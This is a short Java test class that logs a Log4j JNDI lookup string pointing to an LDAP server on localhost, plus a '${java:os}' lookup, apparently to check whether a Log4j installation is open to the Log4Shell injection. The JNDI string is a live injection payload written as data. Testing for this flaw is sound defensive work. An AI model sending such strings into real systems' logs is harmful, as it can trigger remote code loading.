package com.mycompany.helloworld.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.util.StackLocatorUtil;

public class Log4JBugTest {
    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        String a = "${jndi:ldap://127.0.0.1:1389/#Log4JBugTest}";
        logger.error("a={}", a);
        logger.info("logger info");
        String t = "${java:os}";
        logger.info(t);

        System.out.println(StackLocatorUtil.getCallerClass(1));
    }
}
